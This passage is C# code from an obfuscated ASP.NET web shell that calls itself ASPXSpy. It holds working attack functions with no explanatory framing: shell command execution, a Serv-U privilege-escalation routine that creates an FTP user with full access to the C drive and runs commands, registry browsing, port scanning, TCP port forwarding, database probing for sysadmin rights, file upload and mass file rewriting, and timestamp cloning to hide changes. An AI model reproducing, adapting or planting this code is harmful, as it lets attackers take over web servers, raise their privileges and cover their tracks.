catch(Exception error)
{
xqD();
}
}
public void jbT()
{
try
{
RegistryKey rSv=Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp");
string ocLr=PElH(rSv,"PortNumber");
RegistryKey oWL=Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\CentralProcessor");
int cpu=oWL.SubKeyCount;
RegistryKey iNop=Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\CentralProcessor\0\");
string lQH=PElH(iNop,"ProcessorNameString");
Tij();
GvsD.Visible=true;
BAv.InnerText="System Information >>";
UCXm.InnerText="MAC Information >>";
Dbxd.InnerText="Driver Information >>";
StringBuilder LBXvL=new StringBuilder();
StringBuilder gPNSF=new StringBuilder();
StringBuilder JROW=new StringBuilder();
LBXvL.Append("<li><u>Server Domain : </u>"+Request.ServerVariables["SERVER_NAME"]+"</li>");
LBXvL.Append("<li><u>Server Ip : </u>"+Request.ServerVariables["LOCAL_ADDR"]+":"+Request.ServerVariables["SERVER_PORT"]+"</li>");
LBXvL.Append("<li><u>Terminal Port : </u>"+ocLr+"</li>");
LBXvL.Append("<li><u>Server OS : </u>"+Environment.OSVersion+"</li>");
LBXvL.Append("<li><u>Server Software : </u>"+Request.ServerVariables["SERVER_SOFTWARE"]+"</li>");
LBXvL.Append("<li><u>Server UserName : </u>"+Environment.UserName+"</li>");
LBXvL.Append("<li><u>Server Time : </u>"+System.DateTime.Now.ToString()+"</li>");
LBXvL.Append("<li><u>Server TimeZone : </u>"+yfyd("Win32_TimeZone").Rows[0]["Caption"]+"</li>");
DataTable BIOS=yfyd("Win32_BIOS");
LBXvL.Append("<li><u>Server BIOS : </u>"+BIOS.Rows[0]["Manufacturer"]+" : "+BIOS.Rows[0]["Name"]+"</li>");
LBXvL.Append("<li><u>CPU Count : </u>"+cpu.ToString()+"</li>");
LBXvL.Append("<li><u>CPU Version : </u>"+lQH+"</li>");
DataTable Ksh=yfyd("Win32_PhysicalMemory");
Int64 OPUk=0;
for(int i=0;i<Ksh.Rows.Count;i++)
{
OPUk+=Int64.Parse(Ksh.Rows[0]["Capacity"].ToString());
}
LBXvL.Append("<li><u>Server Ksh : </u>"+yeeIu(OPUk)+"</li>");
DataTable KxkH=yfyd("Win32_NetworkAdapterConfiguration");
for(int i=0;i<KxkH.Rows.Count;i++)
{
gPNSF.Append("<li><u>Server MAC"+i+" : </u>"+KxkH.Rows[i]["Caption"]+"</li>");
if(KxkH.Rows[i]["MACAddress"]!=string.Empty)
{
gPNSF.Append("<li style=\"list-style:none;\"><u>Address : </u>"+KxkH.Rows[i]["MACAddress"]+"</li>");
}
}
DataTable Driver=yfyd("Win32_SystemDriver");
for (int i=0; i<Driver.Rows.Count; i++)
{
JROW.Append("<li><u class='u1'>Server Driver"+i+" : </u><u class='u2'>"+Driver.Rows[i]["Caption"]+"</u> ");
//JROW.Append("<li><u class='u1'>Server Driver"+i+" : "+Driver.Rows[i]["Caption"]+"</u>");
if (Driver.Rows[i]["PathName"]!=string.Empty)
{
JROW.Append("Path : "+Driver.Rows[i]["PathName"]);
}
else
{
JROW.Append("No path information");
}
JROW.Append("</li>");
}
wdyr.InnerHtml=LBXvL.ToString();
Bin_Ul_NetConfig.InnerHtml=gPNSF.ToString();
Bin_Ul_Driver.InnerHtml=JROW.ToString();
}
catch(Exception error)
{
NxO(error.Message);
}
}
public void EkDgp()
{
Tij();
Ixlp.Visible=true;
BAv.InnerText="Serv-U Exec >>";
}
public void czPT()
{
string VdhOy=string.Empty;
string user=Kny.Value;
string pass=LAr.Value;
int port=Int32.Parse(HgcZf.Value);
string cmd=Pof.Value;
string MCd="user "+user+"\r\n";
string qPS="pass "+pass+"\r\n";
string site="SITE MAINTENANCE\r\n";
string EZnU="-DELETEDOMAIN\r\n-IP=0.0.0.0\r\n PortNo=52521\r\n";
string LfFOT="-SETDOMAIN\r\n-Domain=BIN|0.0.0.0|52521|-1|1|0\r\n-TZOEnable=0\r\n TZOKey=\r\n";
string DzzZ="-SETUSERSETUP\r\n-IP=0.0.0.0\r\n-PortNo=52521\r\n-User=bin\r\n-Password=binftp\r\n-HomeDir=c:\\\r\n-LoginMesFile=\r\n-Disable=0\r\n-RelPaths=1\r\n-NeedSecure=0\r\n-HideHidden=0\r\n-AlwaysAllowLogin=0\r\n-ChangePassword=0\r\n-QuotaEnable=0\r\n-MaxUsersLoginPerIP=-1\r\n-SpeedLimitUp=0\r\n-SpeedLimitDown=0\r\n-MaxNrUsers=-1\r\n-IdleTimeOut=600\r\n-SessionTimeOut=-1\r\n-Expire=0\r\n-RatioDown=1\r\n-RatiosCredit=0\r\n-QuotaCurrent=0\r\n-QuotaMaximum=0\r\n-Maintenance=System\r\n-PasswordType=Regular\r\n-Ratios=NoneRN\r\n Access=c:\\|RWAMELCDP\r\n";
string Ngawm="QUIT\r\n";
LnqB.Visible=true;
try
{
tcp.Connect("127.0.0.1",port);
tcp.ReceiveBufferSize=1024;
NS=tcp.GetStream();
Rev(NS);
rfy(NS,MCd);
Rev(NS);
rfy(NS,qPS);
Rev(NS);
rfy(NS,site);
Rev(NS);
rfy(NS,EZnU);
Rev(NS);
rfy(NS,LfFOT);
Rev(NS);
rfy(NS,DzzZ);
Rev(NS);
hEf.InnerHtml+="<font color=\"green\"><b>Exec Cmd.................\r\n</b></font>";
IZdg.Connect(Request.ServerVariables["LOCAL_ADDR"],52521);
NS1=IZdg.GetStream();
Rev(NS1);
rfy(NS1,"user bin\r\n");
Rev(NS1);
rfy(NS1,"pass binftp\r\n");
Rev(NS1);
rfy(NS1,"site exec "+cmd+"\r\n");
Rev(NS1);
rfy(NS1,"quit\r\n");
Rev(NS1);
IZdg.Close();
rfy(NS,EZnU);
Rev(NS);
tcp.Close();
}
catch(Exception error)
{
NxO(error.Message);
}
}
protected void Rev(NetworkStream instream)
{
string kVsGv=string.Empty;
if(instream.CanRead)
{
byte[] YDxfH=new byte[1024];
do
{
System.Threading.Thread.Sleep(50);
int len=instream.Read(YDxfH,0,YDxfH.Length);
kVsGv+=Encoding.Default.GetString(YDxfH,0,len);
}
while(instream.DataAvailable);
}
hEf.InnerHtml+="<font color=red>"+kVsGv.Replace("\0","")+"</font>";
}
protected void rfy(NetworkStream instream,string Sendstr)
{
if(instream.CanWrite)
{
byte[] YDxfH=Encoding.Default.GetBytes(Sendstr);
instream.Write(YDxfH,0,YDxfH.Length);
}
hEf.InnerHtml+="<font color=blue>"+Sendstr+"</font>";
}
public void FJyUd()
{
Tij();
qEMR.Visible=true;
BAv.InnerText="RegShell >>";
string PiKbY=@"HKEY_LOCAL_MACHINE|HKEY_CLASSES_ROOT|HKEY_CURRENT_USER|HKEY_USERS|HKEY_CURRENT_CONFIG";
oSt.Text="";
foreach(string rootkey in PiKbY.Split('|'))
{
oSt.Text+="<a href=\"javascript:Bin_PostBack('Bin_Regread','"+SOfU(rootkey)+"')\">"+rootkey+"</a> | ";
}
THdw();
}
protected void THdw()
{
Fipg.Text="";
string PiKbY=@"HKEY_LOCAL_MACHINE|HKEY_CLASSES_ROOT|HKEY_CURRENT_USER|HKEY_USERS|HKEY_CURRENT_CONFIG";
TableRow tr;
TableCell tc;
foreach(string rootkey in PiKbY.Split('|'))
{
tr=new TableRow();
tc=new TableCell();
string bg=lDD();
tr.Attributes["onmouseover"]="this.className='focus';";
tr.CssClass=bg;
tr.Attributes["onmouseout"]="this.className='"+bg+"';";
tc.Width=Unit.Parse("40%");
tc.Text="<a href=\"javascript:Bin_PostBack('Bin_Regread','"+SOfU(rootkey)+"')\">"+rootkey+"</a>";
tr.Cells.Add(tc);
tc=new TableCell();
tc.Width=Unit.Parse("60%");
tc.Text="&lt;RootKey&gt;";
tr.Cells.Add(tc);
bsr.Rows.Add(tr);
}
}
protected void Ipm(string Reg_Path)
{
if(!Reg_Path.EndsWith("\\"))
{
Reg_Path=Reg_Path+"\\";
}
Fipg.Text=Reg_Path;
string qTJ=Regex.Replace(Reg_Path,@"\\[^\\]+\\?$","");
qTJ=Regex.Replace(qTJ,@"\\+","\\");
TableRow tr=new TableRow();
TableCell tc=new TableCell();
string bg=lDD();
tr.Attributes["onmouseover"]="this.className='focus';";
tr.CssClass=bg;
tr.Attributes["onmouseout"]="this.className='"+bg+"';";
tc.Text="<a href=\"javascript:Bin_PostBack('Bin_Regread','"+SOfU(qTJ)+"')\">Parent Key</a>";
tc.Attributes["colspan"]="2" ;
tr.Cells.Add(tc);
bsr.Rows.Add(tr);
try
{
string subpath;
string ZVi=Reg_Path.Substring(Reg_Path.IndexOf("\\")+1,Reg_Path.Length-Reg_Path.IndexOf("\\")-1);
RegistryKey rk=null;
RegistryKey sk;
if(Reg_Path.StartsWith("HKEY_LOCAL_MACHINE"))
{
rk=Registry.LocalMachine;
}
else if(Reg_Path.StartsWith("HKEY_CLASSES_ROOT"))
{
rk=Registry.ClassesRoot;
}
else if(Reg_Path.StartsWith("HKEY_CURRENT_USER"))
{
rk=Registry.CurrentUser;
}
else if(Reg_Path.StartsWith("HKEY_USERS"))
{
rk=Registry.Users;
}
else if(Reg_Path.StartsWith("HKEY_CURRENT_CONFIG"))
{
rk=Registry.CurrentConfig;
}
if(ZVi.Length>1)
{
sk=rk.OpenSubKey(ZVi);
}
else
{
sk=rk;
}
foreach(string innerSubKey in sk.GetSubKeyNames())
{
tr=new TableRow();
tc=new TableCell();
bg=lDD();
tr.Attributes["onmouseover"]="this.className='focus';";
tr.CssClass=bg;
tr.Attributes["onmouseout"]="this.className='"+bg+"';";
tc.Width=Unit.Parse("40%");
tc.Text="<a href=\"javascript:Bin_PostBack('Bin_Regread','"+SOfU(Reg_Path+innerSubKey)+"')\">"+innerSubKey+"</a>";
tr.Cells.Add(tc);
tc=new TableCell();
tc.Width=Unit.Parse("60%");
tc.Text="&lt;SubKey&gt;";
tr.Cells.Add(tc);
bsr.Rows.Add(tr);
}
TableRow gCli=new TableRow();
gCli.Attributes["style"]="border-top:1px solid #fff;border-bottom:1px solid #ddd;";
gCli.Attributes["bgcolor"]="#dddddd";
TableCell gyNa=new TableCell();
gyNa.Attributes["colspan"]="2" ;
gyNa.Attributes["height"]="5";
gCli.Cells.Add(gyNa);
bsr.Rows.Add(gCli);
foreach(string strValueName in sk.GetValueNames())
{
tr=new TableRow();
tc=new TableCell();
bg=lDD();
tr.Attributes["onmouseover"]="this.className='focus';";
tr.CssClass=bg;
tr.Attributes["onmouseout"]="this.className='"+bg+"';";
tc.Width=Unit.Parse("40%");
tc.Text=strValueName;
tr.Cells.Add(tc);
tc=new TableCell();
tc.Width=Unit.Parse("60%");
tc.Text=PElH(sk,strValueName);
tr.Cells.Add(tc);
bsr.Rows.Add(tr);
}
}
catch(Exception error)
{
NxO(error.Message);
}
}
public string PElH(RegistryKey sk,string strValueName)
{
object YDxfH;
string SfJEi="";
try
{
YDxfH=sk.GetValue(strValueName,"NULL");
if(YDxfH.GetType()==typeof(byte[]))
{
foreach(byte tmpbyte in(byte[])YDxfH)
{
if((int)tmpbyte<16)
{
SfJEi+="0";
}
SfJEi+=tmpbyte.ToString("X");
}
}
else if(YDxfH.GetType()==typeof(string[]))
{
foreach(string tmpstr in(string[])YDxfH)
{
SfJEi+=tmpstr;
}
}
else
{
SfJEi=YDxfH.ToString();
}
}
catch(Exception error)
{
NxO(error.Message);
}
return SfJEi;
}
public void gsU()
{
Tij();
miYnm.Visible=true;
BAv.InnerText="PortScan >>";
}
public void HzD()
{
Tij();
saE.Visible=true;
yaDo.Visible=false;
BAv.InnerText="DataBase >>";
}
protected void FcS()
{
if(jWP.State==ConnectionState.Closed)
{
try
{
jWP.ConnectionString=ptuW.Text;
NkAL.Connection=jWP;
jWP.Open();
}
catch(Exception Error)
{
NxO(Error.Message);
}
}
}
protected void WmE()
{
if(jWP.State==ConnectionState.Open)
{
jWP.Close();
}
jWP.Dispose();
NkAL.Dispose();
}
public DataTable Heg(string sqlstr)
{
OleDbDataAdapter da=new OleDbDataAdapter();
DataTable HnRS=new DataTable();
try
{
FcS();
NkAL.CommandType=CommandType.Text;
NkAL.CommandText=sqlstr;
da.SelectCommand=NkAL;
da.Fill(HnRS);
}
catch(Exception)
{
}
finally
{
WmE();
}
return HnRS;
}
public DataTable[] Bin_Data(string query)
{
ArrayList list=new ArrayList();
try
{
string str;
FcS();
query=query+"\r\n";
MatchCollection iTQx=new Regex("[\r\n][gG][oO][\r\n]").Matches(query);
int hnXib=0;
for(int i=0;i<iTQx.Count;i++)
{
Match Ekk=iTQx[i];
str=query.Substring(hnXib,Ekk.Index-hnXib);
if(str.Trim().Length>0)
{
OleDbDataAdapter NPD=new OleDbDataAdapter();
NkAL.CommandType=CommandType.Text;
NkAL.CommandText=str.Trim();
NPD.SelectCommand=NkAL;
DataSet ZVFp=new DataSet();
NPD.Fill(ZVFp);
for(int j=0;j<ZVFp.Tables.Count;j++)
{
list.Add(ZVFp.Tables[j]);
}
}
hnXib=Ekk.Index+3;
}
str=query.Substring(hnXib,query.Length-hnXib);
if(str.Trim().Length>0)
{
OleDbDataAdapter BNoA=new OleDbDataAdapter();
NkAL.CommandType=CommandType.Text;
NkAL.CommandText=str.Trim();
BNoA.SelectCommand=NkAL;
DataSet DLzd=new DataSet();
BNoA.Fill(DLzd);
for(int k=0;k<DLzd.Tables.Count;k++)
{
list.Add(DLzd.Tables[k]);
}
}
}
catch(SqlException e)
{
NxO(e.Message);
kzgTa.Visible=false;
}
return(DataTable[])list.ToArray(typeof(DataTable));
}
public void piI(string instr)
{
try
{
FcS();
NkAL.CommandType=CommandType.Text;
NkAL.CommandText=instr;
NkAL.ExecuteNonQuery();
}
catch(Exception e)
{
NxO(e.Message);
}
}
public void igMz()
{
try
{
FcS();
if(yxcP.SelectedItem.Text=="MSSQL")
{
if(Qnq.SelectedItem.Value!="")
{
jWP.ChangeDatabase(Qnq.SelectedItem.Value.ToString());
}
}
DataTable[] jSqnK=null;
jSqnK=Bin_Data(YOKv.InnerText);
if(jSqnK!=null&&jSqnK.Length>0)
{
for(int j=0;j<jSqnK.Length;j++)
{
kzgTa.PreRender+=new EventHandler(zUW);
kzgTa.DataSource=jSqnK[j];
kzgTa.DataBind();
for(int i=0;i<kzgTa.Items.Count;i++)
{
string bg=lDD();
kzgTa.Items[i].CssClass=bg;
kzgTa.Items[i].Attributes["onmouseover"]="this.className='focus';";
kzgTa.Items[i].Attributes["onmouseout"]="this.className='"+bg+"';";
}
}
}
else
{
kzgTa.DataSource=null;
kzgTa.DataBind();
}
kzgTa.Visible=true;
}
catch(Exception e)
{
NxO(e.Message);
kzgTa.Visible=false;
}
}
public void fZKGP()
{
try
{
if(yxcP.SelectedItem.Text=="MSSQL"&&Qnq.SelectedItem.Value=="")
{
kzgTa.DataSource=null;
kzgTa.DataBind();
return;
}
FcS();
DataTable VVrW=new DataTable();
DataTable jSqnK=new DataTable();
DataTable AqB=new DataTable();
if(yxcP.SelectedItem.Text=="MSSQL"&&Qnq.SelectedItem.Value!="")
{
jWP.ChangeDatabase(Qnq.SelectedItem.Text);
}
VVrW=jWP.GetOleDbSchemaTable(OleDbSchemaGuid.Tables,new Object[] { null,null,null,"SYSTEM TABLE" });
jSqnK=jWP.GetOleDbSchemaTable(OleDbSchemaGuid.Tables,new Object[] { null,null,null,"TABLE" });
foreach(DataRow dr in VVrW.Rows)
{
jSqnK.ImportRow(dr);
}
jSqnK.Columns.Remove("TABLE_CATALOG");jSqnK.Columns.Remove("TABLE_SCHEMA");jSqnK.Columns.Remove("DESCRIPTION");jSqnK.Columns.Remove("TABLE_PROPID");
kzgTa.PreRender+=new EventHandler(zUW);
kzgTa.DataSource=jSqnK;
kzgTa.DataBind();
for(int i=0;i<kzgTa.Items.Count;i++)
{
string bg=lDD();
string eioq=kzgTa.Items[i].Cells[0].Text;
kzgTa.Items[i].CssClass=bg;
kzgTa.Items[i].Attributes["onmouseover"]="this.className='focus';";
kzgTa.Items[i].Attributes["onmouseout"]="this.className='"+bg+"';";
kzgTa.Items[i].Attributes["onclick"]="ASPXSpy.YOKv.value='select * from " + eioq + "';";
}
kzgTa.Visible=true;
}
catch(Exception e)
{
NxO(e.Message);
kzgTa.Visible=false;
}
}
private void zUW(object sender,EventArgs e)
{
DataGrid d=(DataGrid)sender;
foreach(DataGridItem item in d.Items)
{
foreach(TableCell t in item.Cells)
{
// t.Text=Server.HtmlEncode(t.Text);
t.Text=t.Text.Replace("<","&lt;").Replace(">","&gt;");
}
}
}
public void PuJaR()
{
yaDo.Visible=true;
try
{
YOKv.InnerHtml=string.Empty;
if(yxcP.SelectedItem.Text=="MSSQL")
{
kzgTa.Visible=false;
TzvNe.Visible=true;
DSo.Visible=true;
FcS();
string cdb=jWP.Database;
string qkqlq=Heg(@"SELECT @@VERSION").Rows[0][0].ToString();
DataTable dbs=Heg(@"SELECT name FROM master..sysdatabases");
DataTable rol=Heg(@"SELECT IS_SRVROLEMEMBER('sysadmin')");
DataTable zqy=Heg(@"SELECT IS_MEMBER('db_owner')");
string dbo=string.Empty;
if(zqy.Rows[0][0].ToString()=="1")
{
dbo="db_owner";
}
else
{
dbo="public";
}
if(rol.Rows[0][0].ToString()=="1")
{
dbo="<font color=blue>sa</font>";
}
rPLN.SelectedIndex=0;
Qnq.Items.Clear();
for(int i=0;i<dbs.Rows.Count;i++)
{
Qnq.Items.Add(dbs.Rows[i][0].ToString());
if (cdb==dbs.Rows[i][0].ToString())
{
Qnq.Items[i].Selected=true;
}
}
DSo.InnerHtml="<p><font color=red>MSSQL Version</font> : <i><b>"+qkqlq+"</b></i></p><p><font color=red>SrvRoleMember</font> : <i><b>"+dbo+"</b></i></p>";
}
else
{
TzvNe.Visible=false;
DSo.Visible=false;
}
fZKGP();
}
catch(Exception e)
{
//NxO(e.Message);
yaDo.Visible=false;
}
}
public void sZpf()
{
Tij();
MiGuK.Visible=true;
BAv.InnerText="PortMap >>";
}
public class PortForward
{
public string Localaddress;
public int LocalPort;
public string RemoteAddress;
public int RemotePort;
string type;
Socket ltcpClient;
Socket rtcpClient;
Socket server;
byte[] oAIF=new byte[2048];
byte[] cps=new byte[2048];
public struct session
{
public Socket rdel;
public Socket ldel;
public int llen;
public int rlen;
}
public static IPEndPoint mxV(string host,int port)
{
IPEndPoint iep=null;
IPHostEntry Bmf=Dns.Resolve(host);
IPAddress DAg=Bmf.AddressList[0];
iep=new IPEndPoint(DAg,port);
return iep;
}
public void Start(string Rip,int Rport,string lip,int lport)
{
try
{
LocalPort=lport;
RemoteAddress=Rip;
RemotePort=Rport;
Localaddress=lip;
rtcpClient=new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp);
ltcpClient=new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp);
rtcpClient.BeginConnect(mxV(RemoteAddress,RemotePort),new AsyncCallback(iSQ),rtcpClient);
}
catch (Exception ex) { }
}
protected void iSQ(IAsyncResult ar)
{
try
{
session SiCf=new session();
SiCf.ldel=ltcpClient;
SiCf.rdel=rtcpClient;
ltcpClient.BeginConnect(mxV(Localaddress,LocalPort),new AsyncCallback(jOfE),SiCf);
}
catch (Exception ex) { }
}
protected void jOfE(IAsyncResult ar)
{
try
{
session SiCf=(session)ar.AsyncState;
ltcpClient.EndConnect(ar);
SiCf.rdel.BeginReceive(oAIF,0,oAIF.Length,SocketFlags.None,new AsyncCallback(AWB),SiCf);
SiCf.ldel.BeginReceive(cps,0,cps.Length,SocketFlags.None,new AsyncCallback(Azr),SiCf);
}
catch (Exception ex) { }
}
private void AWB(IAsyncResult ar)
{
try
{
session SiCf=(session)ar.AsyncState;
int Ret=SiCf.rdel.EndReceive(ar);
if (Ret>0)
ltcpClient.BeginSend(oAIF,0,Ret,SocketFlags.None,new AsyncCallback(UPu),SiCf);
else ucPw();
}
catch (Exception ex) { }
}
private void UPu(IAsyncResult ar)
{
try
{
session SiCf=(session)ar.AsyncState;
SiCf.ldel.EndSend(ar);
SiCf.rdel.BeginReceive(oAIF,0,oAIF.Length,SocketFlags.None,new AsyncCallback(this.AWB),SiCf);
}
catch (Exception ex) { }
}
private void Azr(IAsyncResult ar)
{
try
{
session SiCf=(session)ar.AsyncState;
int Ret=SiCf.ldel.EndReceive(ar);
if (Ret>0)
SiCf.rdel.BeginSend(cps,0,Ret,SocketFlags.None,new AsyncCallback(jgp),SiCf);
else ucPw();
}
catch (Exception ex) { }
}
private void jgp(IAsyncResult ar)
{
try
{
session SiCf=(session)ar.AsyncState;
SiCf.rdel.EndSend(ar);
SiCf.ldel.BeginReceive(cps,0,cps.Length,SocketFlags.None,new AsyncCallback(this.Azr),SiCf);
}
catch (Exception ex) { }
}
public void ucPw()
{
try
{
if (ltcpClient!=null)
{
ltcpClient.Close();
}
if (rtcpClient!=null)
rtcpClient.Close();
}
catch (Exception ex) { }
}
}
protected void vcyAs()
{
PortForward thJA=new PortForward();
thJA.ucPw();
}
protected void NfM()
{
PortForward thJA=new PortForward();
thJA.Start(Pxtw.Value,int.Parse(DcH.Value),kfr.Value,int.Parse(cNc.Value));
}
public string QqLp(string instr)
{
string tmp=null;
try
{
tmp=System.Net.Dns.Resolve(instr).AddressList[0].ToString();
}
catch(Exception e)
{
}
return tmp;
}
public void mepF()
{
string[] joL=pNY.Text.ToString().Split(',');
for(int i=0;i<joL.Length;i++)
{
kVaC.Add(new ScanPort(QqLp(ThIG.Text.ToString()),Int32.Parse(joL[i])));
}
try
{
Thread[] exH=new Thread[kVaC.Count];
int JKHp=0;
for(JKHp=0;JKHp<kVaC.Count;JKHp++)
{
exH[JKHp]=new Thread(new ThreadStart(((ScanPort)kVaC[JKHp]).Scan));
exH[JKHp].Start();
}
for(JKHp=0;JKHp<exH.Length;JKHp++)
exH[JKHp].Join();
}
catch
{
}
}
public class ScanPort
{
private string _ip="";
private int PAuD=0;
private TimeSpan _timeSpent;
private string OUF="Not scanned";
public string ip
{
get { return _ip;}
}
public int port
{
get { return PAuD;}
}
public string status
{
get { return OUF;}
}
public TimeSpan timeSpent
{
get { return _timeSpent;}
}
public ScanPort(string ip,int port)
{
_ip=ip;
PAuD=port;
}
public void Scan()
{
TcpClient ityW=new TcpClient();
DateTime fwLp=DateTime.Now;
try
{
ityW.Connect(_ip,PAuD);
ityW.Close();
OUF="<font color=green><b>Open</b></font>";
}
catch
{
OUF="<font color=red><b>Close</b></font>";
}
_timeSpent=DateTime.Now.Subtract(fwLp);
}
}
public static void NOBv(System.Web.UI.Page page)
{
page.RegisterHiddenField("__EVENTTARGET","");
page.RegisterHiddenField("__FILE","");
string s=@"<script language=Javascript>";
s+=@"function Bin_PostBack(eventTarget,eventArgument)";
s+=@"{";
s+=@"var theform=document.forms[0];";
s+=@"theform.__EVENTTARGET.value=eventTarget;";
s+=@"theform.__FILE.value=eventArgument;";
s+=@"theform.submit();";
s+=@"} ";
s+=@"</scr"+"ipt>";
page.RegisterStartupScript("",s);
}
protected void xQmOO(object sender,EventArgs e)
{
Tij();
TSVl.Visible=true;
BAv.InnerText="File Search >>";
sPzI.Value=Request.PhysicalApplicationPath;
gAb.Visible=false;
}
protected void KFh(object sender,EventArgs e)
{
DirectoryInfo JNhI=new DirectoryInfo(sPzI.Value);
if(!JNhI.Exists)
{
NxO("Path invalid ! ");
return;
}
xZcj(JNhI);
NxO("Search completed ! ");
}
public void xZcj(DirectoryInfo dir)
{
try
{
gAb.Visible=true;
foreach(FileInfo Bin_Files in dir.GetFiles())
{
try
{
if(Bin_Files.FullName==Request.PhysicalPath)
{
continue;
}
if(!Regex.IsMatch(Bin_Files.Extension.Replace(".",""),"^("+Vpf.Value+")$",RegexOptions.IgnoreCase))
{
continue;
}
if(jaDko.SelectedItem.Value=="name")
{
if(rxRa.Checked)
{
if(Regex.IsMatch(Bin_Files.Name,FTlA.Value,RegexOptions.IgnoreCase))
{
pZxu(Bin_Files);
}
}
else
{
if(Bin_Files.Name.ToLower().IndexOf(FTlA.Value.ToLower())!=-1)
{
Response.Write(Bin_Files.FullName);
pZxu(Bin_Files);
}
}
}
else
{
StreamReader sr=new StreamReader(Bin_Files.FullName,Encoding.Default);
string Yibw=sr.ReadToEnd();
sr.Close();
if(rxRa.Checked)
{
if(Regex.IsMatch(Yibw,FTlA.Value,RegexOptions.IgnoreCase))
{
pZxu(Bin_Files);
if(FZbH.Checked)
{
Yibw=Regex.Replace(Yibw,FTlA.Value,bPlYD.Value,RegexOptions.IgnoreCase);
StreamWriter sw=new StreamWriter(Bin_Files.FullName,false,Encoding.Default);
sw.Write(Yibw);
sw.Close();
}
}
}
else
{
if(Yibw.ToLower().IndexOf(FTlA.Value.ToLower())!=-1)
{
pZxu(Bin_Files);
if(FZbH.Checked)
{
Yibw=Strings.Replace(Yibw,FTlA.Value,bPlYD.Value,1,-1,CompareMethod.Text);
StreamWriter sw=new StreamWriter(Bin_Files.FullName,false,Encoding.Default);
sw.Write(Yibw);
sw.Close();
}
}
}
}
}
catch(Exception ex)
{
NxO(ex.Message);
continue;
}
}
foreach(DirectoryInfo subdir in dir.GetDirectories())
{
xZcj(subdir);
}
}
catch(Exception ex)
{
NxO(ex.Message);
}
}
public void pZxu(FileInfo objfile)
{
TableRow tr=new TableRow();
TableCell tc=new TableCell();
string bg=lDD();
tr.Attributes["onmouseover"]="this.className='focus';";
tr.CssClass=bg;
tr.Attributes["onmouseout"]="this.className='"+bg+"';";
tc.Text="<a href=\"javascript:Bin_PostBack('Bin_Listdir','"+SOfU(objfile.DirectoryName)+"')\">"+objfile.FullName+"</a>";
tr.Cells.Add(tc);
tc=new TableCell();
tc.Text=objfile.LastWriteTime.ToString();
tr.Cells.Add(tc);
tc=new TableCell();
tc.Text=yeeIu(objfile.Length);
tr.Cells.Add(tc);
gAb.Rows.Add(tr);
}
public void NxO(string instr)
{
yKfx.Visible=true;
yKfx.InnerText=instr;
}
// BUTTON EVENT
protected void vASke(object sender,EventArgs e)
{
string ztm=FormsAuthentication.HashPasswordForStoringInConfigFile(WUm.Text,"MD5").ToLower();
if(ztm==Password)
{
Response.Cookies.Add(new HttpCookie(iSBEf,Password));
Vrro.Visible=false;
nqu();
}
else
{
jPEt();
}
}
protected void wkn(object sender,EventArgs e)
{
jWR(Server.MapPath("."));
}
protected void Ypkbj(object sender,EventArgs e)
{
BAv.InnerText="IIS Spy >>";
Tij();
ADy.Visible=true;
xbsPz();
}
protected void CLClp(object sender,EventArgs e)
{
try
{
StreamWriter sw;
if(qtw.SelectedItem.Text=="UTF-8")
{
sw=new StreamWriter(wuBA.Value,false,Encoding.UTF8);
}
else
{
sw=new StreamWriter(wuBA.Value,false,Encoding.Default);
}
sw.Write(tFp.InnerText);
sw.Close();
NxO("Save file success !");
}
catch(Exception error)
{
NxO(error.Message);
}
jWR(SLfr.Value);
}
protected void JFpm(object sender,EventArgs e)
{
string FSP=SLfr.Value;
FSP=mzCU(FSP);
try
{
GVIv.PostedFile.SaveAs(FSP+Path.GetFileName(GVIv.Value));
NxO("File upload success!");
}
catch(Exception error)
{
NxO(error.Message);
}
jWR(SLfr.Value);
}
protected void VwKE(object sender,EventArgs e)
{
jWR(SLfr.Value);
}
protected void QErPn(object sender,EventArgs e)
{
jWR(Server.MapPath("."));
}
protected void CPWHl(object sender,CommandEventArgs e)
{
jWR(e.CommandArgument.ToString());
}
protected void KuKWS(object sender,EventArgs e)
{
try
{
File.SetCreationTimeUtc(XhKp.Value,File.GetCreationTimeUtc(sFHT.Value));
File.SetLastAccessTimeUtc(XhKp.Value,File.GetLastAccessTimeUtc(sFHT.Value));
File.SetLastWriteTimeUtc(XhKp.Value,File.GetLastWriteTimeUtc(sFHT.Value));
NxO("File time clone success!");
}
catch(Exception error)
{
NxO(error.Message);
}
jWR(SLfr.Value);
}
protected void Bmsez(object sender,EventArgs e)
{
string path=ccKmv.Value;
try
{
File.SetAttributes(path,FileAttributes.Normal);
if(eyc.Checked)
{
File.SetAttributes(path,FileAttributes.ReadOnly);
}
if(pFP.Checked)
{
File.SetAttributes(path,File.GetAttributes(path)| FileAttributes.System);
}
if(FeH.Checked)
{
File.SetAttributes(path,File.GetAttributes(path)| FileAttributes.Hidden);
}
if(ldVI.Checked)
{
File.SetAttributes(path,File.GetAttributes(path)| FileAttributes.Archive);
}
File.SetCreationTimeUtc(path,Convert.ToDateTime(VQcc.Value));
File.SetLastAccessTimeUtc(path,Convert.ToDateTime(jzRQ.Value));
File.SetLastWriteTimeUtc(path,Convert.ToDateTime(qoH.Value));
NxO("File attributes modify success!");
}
catch(Exception error)
{
NxO(error.Message);
}
jWR(SLfr.Value);
}
protected void ERlO(object sender,EventArgs e)
{
Tij();
oZNc.Visible=true;
BAv.InnerText="Execute Command >>";
}
protected void VobM(object sender,EventArgs e)
{
try
{
Process Tbdw=new Process();
Tbdw.StartInfo.FileName=vUE.Value;
Tbdw.StartInfo.Arguments=cYKl.Value;
Tbdw.StartInfo.UseShellExecute=false;
Tbdw.StartInfo.RedirectStandardInput=true;
Tbdw.StartInfo.RedirectStandardOutput=true;
Tbdw.StartInfo.RedirectStandardError=true;
Tbdw.Start();
string kRng=Tbdw.StandardOutput.ReadToEnd();
kRng=kRng.Replace("<","&lt;");
kRng=kRng.Replace(">","&gt;");
kRng=kRng.Replace("\r\n","<br>");
KEb.Visible=true;
KEb.InnerHtml="<hr width=\"100%\" noshade/><pre>"+kRng+"</pre>";
}
catch(Exception error)
{
NxO(error.Message);
}
}
protected void UAX(object sender,EventArgs e)
{
if(Fipg.Text.Length>0)
{
Ipm(Fipg.Text);
}
else
{
THdw();
}
}
protected void YDG(object sender,EventArgs e)
{
txI();
}
protected void QYNA(object sender,EventArgs e)
{
XHp();
}
